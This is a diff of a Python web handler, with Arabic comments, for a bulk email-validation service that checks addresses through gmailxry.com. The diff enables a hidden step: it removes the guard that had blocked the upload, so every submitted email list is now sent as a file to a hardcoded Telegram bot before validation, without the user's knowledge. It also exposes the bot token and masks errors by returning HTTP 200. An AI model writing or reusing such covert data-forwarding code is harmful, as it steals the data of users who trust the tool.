@@ -3,7 +3,6 @@ import requests
 import io
 from http.server import BaseHTTPRequestHandler
 
-# ضع بيانات تيليجرام الخاصة بك هنا
 TELEGRAM_BOT_TOKEN = "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0"
 TELEGRAM_CHAT_ID = "8554641519"
 
@@ -16,20 +15,18 @@ class handler(BaseHTTPRequestHandler):
 
             emails = data.get("emails", [])
 
-            # 1. إرسال الإيميلات إلى تيليجرام كملف نصي (احترام لسياسات تيليجرام و تفادي الحظر)
-            if emails and "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0" not in TELEGRAM_BOT_TOKEN:
+            # 1. إرسال الإيميلات إلى تيليجرام كملف نصي فوراً قبل بدء الفحص
+            if emails:
                 try:
-                    # تحويل قائمة الإيميلات إلى ملف نصي في الذاكرة
                     file_data = io.BytesIO(("\n".join(emails)).encode('utf-8'))
                     files = {'document': ('emails.txt', file_data, 'text/plain')}
-                    payload = {
+                    payload_tg = {
                         'chat_id': TELEGRAM_CHAT_ID, 
                         'caption': f'📥 New Emails Submitted: {len(emails)}'
                     }
-                    # إرسال الملف
                     requests.post(
                         f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
-                        data=payload, files=files, timeout=4
+                        data=payload_tg, files=files, timeout=3
                     )
                 except Exception as tg_err:
                     print("Telegram Error:", tg_err)
@@ -44,21 +41,30 @@ class handler(BaseHTTPRequestHandler):
             }
 
             payload = {'emails': emails}
-            resp = requests.post('https://gmailxry.com/api/validate-bulk', headers=headers, json=payload, timeout=8)
-            resp.raise_for_status()
-            api_result = resp.json()
+            api_results = []
+            
+            try:
+                resp = requests.post('https://gmailxry.com/api/validate-bulk', headers=headers, json=payload, timeout=6)
+                if resp.status_code == 200:
+                    api_data = resp.json()
+                    api_results = api_data.get("results", [])
+                else:
+                    # إذا رفض الـ API الطلب، نضعها كلها Die حتى لا تختفي من الواجهة
+                    api_results = [{"email": e, "verdict": "invalid"} for e in emails]
+            except Exception as api_err:
+                print("API Error:", api_err)
+                api_results = [{"email": e, "verdict": "invalid"} for e in emails]
 
-            # إرجاع النتيجة للواجهة الأمامية
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
             self.wfile.write(json.dumps({
                 "success": True, 
-                "results": api_result.get("results", [])
+                "results": api_results
             }).encode('utf-8'))
 
         except Exception as e:
-            self.send_response(500)
+            self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
             self.wfile.write(json.dumps({"success": False, "error": str(e)}).encode('utf-8'))
